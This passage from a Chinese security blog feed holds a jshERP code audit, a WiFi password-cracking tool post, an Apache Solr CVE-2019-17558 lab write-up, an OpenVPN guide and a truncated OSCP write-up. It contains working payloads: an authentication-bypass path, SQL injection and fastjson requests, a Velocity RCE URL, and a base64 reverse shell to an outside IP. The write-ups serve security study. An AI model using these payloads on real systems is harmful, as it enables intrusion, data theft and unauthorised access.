class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.gitee.starblues&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;springboot-plugin-framework-extension-mybatis&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.2.1-RELEASE&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="2、filter-配置"><a href="#2、filter-配置" class="headerlink" title="2、filter 配置"></a>2、filter 配置</h2><p><strong>先看 doFilter 函数内容</strong></p><p>1、从session中提取user 参数的值，如果不为null，则跳过认证，这里是没有问题的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//具体，比如：处理若用户未登录，则跳转到登录页</span><br><span class="line">Object userInfo = servletRequest.getSession().getAttribute(&quot;user&quot;);</span><br><span class="line">if(userInfo!=null) &#123; //如果已登录，不阻止</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、如果访问的url 中包含 <code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>，这些字符串，则不进行认证。</p><p>这样其实是不严格的，如果url 长这样呢：<code>/doc.html/../home.html</code>，怕会出现未授权访问阿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (requestUrl != null &amp;&amp; (requestUrl.contains(&quot;/doc.html&quot;) ||</span><br><span class="line">    requestUrl.contains(&quot;/register.html&quot;) || requestUrl.contains(&quot;/login.html&quot;))) &#123;</span><br><span class="line">    chain.doFilter(request, response);  // 请求以上URL，均不阻止</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、第三部分少有点绕，总结如下：</p><p>访问<code>.css、.js、.jpg、.png、.gif、.ico、/user/login、/user/registerUser、/v2/api-docs</code>这些内容的时候也不需要认证。同样不严格，如：<code>.css/../home.html</code>，同样存在未授权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (verify(ignoredList, requestUrl)) &#123;</span><br><span class="line">    chain.doFilter(servletRequest, response);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">if (null != allowUrls &amp;&amp; allowUrls.length &gt; 0) &#123;</span><br><span class="line">    for (String url : allowUrls) &#123;</span><br><span class="line">        if (requestUrl.startsWith(url)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、最后如果用户没有权限，则跳转到登录页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servletResponse.sendRedirect(&quot;/login.html&quot;);</span><br></pre></td></tr></table></figure><h1 id="三、SQL注入漏洞"><a href="#三、SQL注入漏洞" class="headerlink" title="三、SQL注入漏洞"></a>三、SQL注入漏洞</h1><p>在<code>pom.xml</code>文件中看到使用的是Mybatis ，所以我们按照Mybatis 的审计思路来</p><p>在<code>mapper</code>文件夹下搜索<code>$</code>符号，尽量查找跟用户有关的操作</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020210402987.png" alt="image-20241020210402987"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectByConditionUnit&quot; parameterType=&quot;com.jsh.erp.datasource.entities.UnitExample&quot; resultMap=&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;&gt;</span><br><span class="line">    select *</span><br><span class="line">    FROM jsh_unit</span><br><span class="line">    where 1=1</span><br><span class="line">    &lt;if test=&quot;name != null&quot;&gt;</span><br><span class="line">        and name like &#x27;%$&#123;name&#125;%&#x27;</span><br><span class="line">    &lt;/if&gt;</span><br><span class="line">    and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">    &lt;if test=&quot;offset != null and rows != null&quot;&gt;</span><br><span class="line">        limit #&#123;offset&#125;,#&#123;rows&#125;</span><br><span class="line">    &lt;/if&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>回溯搜索<code>selectByConditionUnit</code>，只有一个接口和一个用法</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020210849524.png" alt="image-20241020210849524"></p><p>我们一路往上找，这里注意看，不要被迷惑，，转换成了由传递过来的map 控制name 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public final static String SEARCH = &quot;search&quot;;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">private List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)throws Exception &#123;</span><br><span class="line">    String search = map.get(Constants.SEARCH);</span><br><span class="line">    String name = StringUtil.getInfo(search, &quot;name&quot;);</span><br><span class="line">    String order = QueryUtils.order(map);</span><br><span class="line">    return unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在往上来到这里，变成了两个参数控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;</span><br><span class="line">    if (StringUtil.isNotEmpty(apiName)) &#123;</span><br><span class="line">        return container.getCommonQuery(apiName).select(parameterMap);</span><br><span class="line">    &#125;</span><br><span class="line">    return new ArrayList&lt;Object&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个select 在往上找，就来到了最后的controller 层</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020211910734.png" alt="image-20241020211910734"></p><p>我们先在面临的问题是apiName是什么？具体的逻辑在这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@Service</span><br><span class="line">public class InterfaceContainer &#123;</span><br><span class="line">    private final Map&lt;String, ICommonQuery&gt; configComponentMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @Autowired(required = false)</span><br><span class="line">    private synchronized void init(ICommonQuery[] configComponents) &#123;</span><br><span class="line">        for (ICommonQuery configComponent : configComponents) &#123;</span><br><span class="line">            ResourceInfo info = AnnotationUtils.getAnnotation(configComponent, ResourceInfo.class);</span><br><span class="line">            if (info != null) &#123;</span><br><span class="line">                configComponentMap.put(info.value(), configComponent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ICommonQuery getCommonQuery(String apiName) &#123;</span><br><span class="line">        return configComponentMap.get(apiName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>apiName</code>的值会从<code>configComponentMap</code>这个变量中获取，而这个变量在<code>init</code> 函数中被put 压入数据。</p><p>具体的内容是：service下每个文件夹对应一个apiName</p><p>有兴趣的师傅可以跟一下，本人由于水平有限，这里就不跟了</p><p>而我们一开始回溯搜索的<code>selectByConditionUnit</code>实现方法就是在<code>service\unit\UnitService.java</code>，所以这里我们需要的apiName 的值就是unit</p><p>那么我们正向总结一下：</p><ol><li>访问的接口原本是：&#x2F;{apiName}&#x2F;list</li><li>这里apiName 是unit</li><li>需要传入参数有三个：<code>pageSize</code>、<code>currentPage</code>、<code>search</code></li><li>我们主要的点在search这里</li></ol><p>结合未授权访问 构造请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/unit/list?pageSize=&amp;currentPage=&amp;search=jsh&#x27; and sleep(3)--+</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020215836900.png" alt="image-20241020215836900"></p><p>emm，出现异常，且并没有延迟3s，接着再次捋一下整个过程，问题出现在如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)throws Exception &#123;</span><br><span class="line">    String search = map.get(Constants.SEARCH);  // Constants.SEARCH 就是search</span><br><span class="line">    String name = StringUtil.getInfo(search, &quot;name&quot;);// 通过StringUtil.getInfo 获取name值</span><br><span class="line">    String order = QueryUtils.order(map);</span><br><span class="line">    return unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));  // QueryUtils.offset(map) 需要我们传入的其他参数有具体的值，且是数字</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这个name值获取过程到底是什么样的？如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static String getInfo(String search, String key)&#123;</span><br><span class="line">    String value = &quot;&quot;;</span><br><span class="line">    if(search!=null) &#123;</span><br><span class="line">        JSONObject obj = JSONObject.parseObject(search);    // 解析成json对象（json反序列化）</span><br><span class="line">        value = obj.getString(key);     // 然后从解析的json对象中拿出来name 的属性值</span><br><span class="line">        if(value.equals(&quot;&quot;)) &#123;</span><br><span class="line">            value = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，我们传入的search 参数内容应该是一个json 内容，修改payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/unit/list?search=/unit/list?search=%7B%22name%22%3A%22jsh%27%20or%201%3D1--%2B%22%7D&amp;pageSize=10&amp;currentPage=1&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020222906819.png" alt="image-20241020222906819"></p><p>当然还有更多的SQL注入漏洞，但是整体思路都差不多</p><h1 id="四、水平越权漏洞"><a href="#四、水平越权漏洞" class="headerlink" title="四、水平越权漏洞"></a>四、水平越权漏洞</h1><p>那么伴随的就是我们的越权漏洞，依然拿上面这个SQL注入漏洞来举列子</p><p>在上方的SQL注入演示中 ，我们是通过登陆进入后台访问接口造成的SQL注入漏洞，如果我们不登陆，能否依然触发这个SQL注入漏洞呢？</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020233203713.png" alt="image-20241020233203713"></p><p>可以看到，当我们去掉cookie 的内容之后，我们将重定向到登录页，这是正常的逻辑。</p><p>但如果我们使用上面filter 分析出来的未授权会如何呢？</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020233339184.png" alt="image-20241020233339184"></p><p>且看，我们此时没有cookie内容，即没有登陆状态，依然造成SQL注入，访问出来了数据库中的数据</p><p>造成这一切的“幕后黑手”就是<code>/doc.html/..</code>。因为在filter  的逻辑中，如果URL中包含doc.html 内容，就不进行认证，直接放行</p><p>而这个越权造成的后果实在太大了，大到可以直接拥有管理员的权限。如：修改密码、增加用户等。</p><p>其他的越权示例不再复现，原理一样</p><h1 id="五、存储型XSS"><a href="#五、存储型XSS" class="headerlink" title="五、存储型XSS"></a>五、存储型XSS</h1><p>在前端html 目录中搜索有关<code>/add</code> 增加的功能页</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232051877.png" alt="image-20241020232051877"></p><p>有一个增加用户的功能点，先增加一个用户</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232746305.png" alt="image-20241020232746305"></p><p>然后修改用户名</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232843671.png" alt="image-20241020232843671"></p><p>成功弹框</p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232854381.png" alt="image-20241020232854381"></p><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020232859791.png" alt="image-20241020232859791"></p><p>为什么先增加再修改，而不是直接增加就添加payload呢？增加的时候限制较多，不如先增加再修改</p><p>但有一个前提是拥有登陆后台的高权限</p><h1 id="六、Fastjson-反序列化漏洞"><a href="#六、Fastjson-反序列化漏洞" class="headerlink" title="六、Fastjson 反序列化漏洞"></a>六、Fastjson 反序列化漏洞</h1><p>之前看 <code>pom.xml</code> 配置文件的时候就发现 项目使用的1.2.55 版本的fastjson 的漏洞，高低得整他两下</p><p>我们先手工测试需要开启AutoType 的方法，在SQL注入的时候就发现一处fastjson 反序列化，在这里开启AutoType</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static String getInfo(String search, String key)&#123;</span><br><span class="line">    String value = &quot;&quot;;</span><br><span class="line">    if(search!=null) &#123;</span><br><span class="line">        JSONObject obj = JSONObject.parseObject(search);    // 解析成json对象（json反序列化）</span><br><span class="line">        value = obj.getString(key);     // 然后从解析的json对象中拿出来name 的属性值</span><br><span class="line">        if(value.equals(&quot;&quot;)) &#123;</span><br><span class="line">            value = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们就顺着SQL注入的链子来到这里，这个search 正好是我们进行SQL注入传递的json 格式</p><p>修改我们SQL注入的payload 为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;3.b3925eed5a.ipv6.1433.eu.org&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png" alt="image-20241020235518738"></p><p>直接未授权打入</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】Python Wifi密码破解-Wifi万能钥匙</title>
      <link href="/2024/10/19/Python-PyWifi/"/>
      <url>/2024/10/19/Python-PyWifi/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-Wifi密码破解-Wifi万能钥匙"><a href="#Python-Wifi密码破解-Wifi万能钥匙" class="headerlink" title="Python Wifi密码破解 - Wifi万能钥匙"></a>Python Wifi密码破解 - Wifi万能钥匙</h1><h1 id="一、Py模块安装"><a href="#一、Py模块安装" class="headerlink" title="一、Py模块安装"></a>一、Py模块安装</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install comtypes</span><br></pre></td></tr></table></figure><h1 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python PyWifi.py</span><br></pre></td></tr></table></figure><p><img src="/img/Python-PyWifi/image-20241019235946937.png" alt="image-20241019235946937"></p><p><img src="/img/Python-PyWifi/image-20241020000304896.png" alt="image-20241020000304896"></p><h1 id="三、字典设置"><a href="#三、字典设置" class="headerlink" title="三、字典设置"></a>三、字典设置</h1><p>默认使用py 脚本同目录下的pass.txt 文件作为字典，可以修改字典位置，或置为空，在代码运行中选择字典位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifi_dic_path = &quot;pass.txt&quot;  # 字典设置</span><br></pre></td></tr></table></figure><p>字典可以社工获取wifi 相关人员信息制作而成，成功率更高</p>]]></content>
      
      
      <categories>
          
          <category> Python武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python武器库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Vulfocus系列】Apache Solr代码执行漏洞 (CVE-2019-17558)</title>
      <link href="/2024/09/22/Vulfocus-solr-RCE/"/>
      <url>/2024/09/22/Vulfocus-solr-RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Apache-Solr代码执行漏洞（CVE-2019-17558）简介"><a href="#一、Apache-Solr代码执行漏洞（CVE-2019-17558）简介" class="headerlink" title="一、Apache Solr代码执行漏洞（CVE-2019-17558）简介"></a>一、Apache Solr代码执行漏洞（CVE-2019-17558）简介</h1><p>Solr是Apache Lucene项目的开源企业搜索平台。 其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理。 2019年10月30日，国外安全研究人员放出了一个关于solr 模板注入的exp，攻击者通过未授权访问solr服务器，发送特定的数据包开启 params.resource.loader.enabled，然后get访问接口导致服务器命令执行。</p><p><strong>影响范围：</strong></p><ul><li>5.0.0 到 8.3.1版本</li></ul><h1 id="二、首页"><a href="#二、首页" class="headerlink" title="二、首页"></a>二、首页</h1><p><img src="/img/Vulfocus-solr-RCE/image-20240922205933443.png" alt="image-20240922205933443"></p><p>发现是8.1.1，存在CVE-2019-17558 漏洞</p><h1 id="三、手工payload"><a href="#三、手工payload" class="headerlink" title="三、手工payload"></a>三、手工payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20240922212059152.png" alt="image-20240922212059152"></p><p>成功执行命令，获取java 的版本号</p><h1 id="四、开启-params-resource-loader-enabled"><a href="#四、开启-params-resource-loader-enabled" class="headerlink" title="四、开启 params.resource.loader.enabled"></a>四、开启 params.resource.loader.enabled</h1><p>未授权访问 &#x2F;solr&#x2F;demo&#x2F;config，并且用BP改包。Content-Type修改成application&#x2F;json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">        &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">        &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">        &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">        &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">        &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20241012210937378.png" alt="image-20241012210937378"></p><h1 id="五、通过Velocity模板执行任意命令"><a href="#五、通过Velocity模板执行任意命令" class="headerlink" title="五、通过Velocity模板执行任意命令"></a>五、通过Velocity模板执行任意命令</h1><h2 id="1、执行任意命令"><a href="#1、执行任意命令" class="headerlink" title="1、执行任意命令"></a>1、执行任意命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><p><img src="/img/Vulfocus-solr-RCE/image-20241012211234005.png" alt="image-20241012211234005"></p><h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>修改中间base64内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/solr/demo/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20-c%20&#123;echo%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTkuMjkuNjcuNC85ODk3IDA%2BJjE%3D&#125;|&#123;base64%2C-d&#125;|&#123;bash%2C-i&#125;%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure><h1 id="六、利用脚本或工具"><a href="#六、利用脚本或工具" class="headerlink" title="六、利用脚本或工具"></a>六、利用脚本或工具</h1><p>有关CVE-2019-17558 漏洞利用脚本在GitHub上有很多</p><p>msf 也内置相关利用</p>]]></content>
      
      
      <categories>
          
          <category> Vulfocus系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulfocus系列靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【课外经验】OpenVPN配置自己的加速器</title>
      <link href="/2024/08/23/Extracurricular-experience-openvpn/"/>
      <url>/2024/08/23/Extracurricular-experience-openvpn/</url>
      
        <content type="html"><![CDATA[<h1 id="一、OpenVPN-服务端设置"><a href="#一、OpenVPN-服务端设置" class="headerlink" title="一、OpenVPN 服务端设置"></a>一、OpenVPN 服务端设置</h1><p>1、配置Openvpn 服务端，需要在阿*云等vps 服务器上设置，先安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2、安装 OpenVPN 后，我们需要生成用于 VPN 隧道加密的静态密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret static-OpenVPN.key</span><br></pre></td></tr></table></figure><p>3、接下来，我们需要启动 OpenVPN 服务端，并用&amp; 将服务端放置在后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4、如果操作正确，vps 现在应该有一个名为 <code>tun0</code> 的新网络接口，其 IP 地址为 <code>172.16.0.1</code></p><p>输入以下命令进行验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a show tun0</span><br></pre></td></tr></table></figure><p>5、要进一步验证 VPN 服务器是否正常运行，请检查系统上的 UDP 端口 1194 是否已打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anu | grep 1194</span><br></pre></td></tr></table></figure><p>有输出则确认VPN 服务器正常运行</p><p>6、确保vps 上的1194端口正常对外开放，没有被防火墙等拦截</p><h1 id="二、OpenVPN-客户端设置"><a href="#二、OpenVPN-客户端设置" class="headerlink" title="二、OpenVPN 客户端设置"></a>二、OpenVPN 客户端设置</h1><p>下面以linux为示例，windows同样</p><p>1、确保客户端有openvpn客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openvpn</span><br></pre></td></tr></table></figure><p>2、将VPN 隧道加密的静态密钥传入客户端，可以通过scp 命令进行ssh 的连接传输</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp user1@linuxconfig:/home/user1/static-OpenVPN.key .</span><br></pre></td></tr></table></figure><p>3、进行openvpn 的连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openvpn --remote YOUR-OPENVPN-SERVER-IP-OR-HOST --dev tun --ifconfig 172.16.0.1 172.16.0.2 --cipher AES-256-CBC --secret static-OpenVPN.key &amp;</span><br></pre></td></tr></table></figure><p>4、VPN 隧道创建可能需要几秒钟的时间。如果成功，您应该看到以下消息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Initialization Sequence Completed</span><br></pre></td></tr></table></figure><p>5、要确认与 VPN 服务器的成功连接，请尝试 ping 远程网络上的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 172.16.0.1</span><br><span class="line">PING 172.16.0.1 (172.16.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.16.0.1: icmp_seq=1 ttl=64 time=0.061 ms</span><br><span class="line"></span><br><span class="line">--- 172.16.0.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 1 received, 0% packet loss, time 0ms</span><br><span class="line">rtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://cn.linux-console.net/?p=10930">基本 Ubuntu 20.04 OpenVPN 客户端&#x2F;服务器连接设置 (linux-console.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Vegeta</title>
      <link href="/2024/08/23/OSCP-Vegeta/"/>
      <url>/2024/08/23/OSCP-Vegeta/</url>
      
        <content type="html"><![CDATA[<h1 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h1><p><img src="/img/OSCP-Vegeta/image-20240823121642788.png" alt="image-20240823121642788"></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><p><img src="/img/OSCP-Vegeta/image-20240823121759816.png" alt="image-20240823121759816"></p><p>只开放22、80端口，加上UDP扫描</p><h2 id="2、服务版本探测"><a href="#2、服务版本探测" class="headerlink" title="2、服务版本探测"></a>2、服务版本探测</h2><p><img src="/img/OSCP-Vegeta/image-20240823122002934.png" alt="image-20240823122002934"></p><p>80的Apache 使用 2.4.38版本，有关这个版本在一定条件下是存在漏洞的，系统跑在Linux 4.x|5.x </p><h2 id="3、漏洞探测"><a href="#3、漏洞探测" class="headerlink" title="3、漏洞探测"></a>3、漏洞探测</h2><p><img src="/img/OSCP-Vegeta/image-20240823122658255.png" alt="image-20240823122658255"></p><p>80端口只扫了一些目录</p><h1 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" 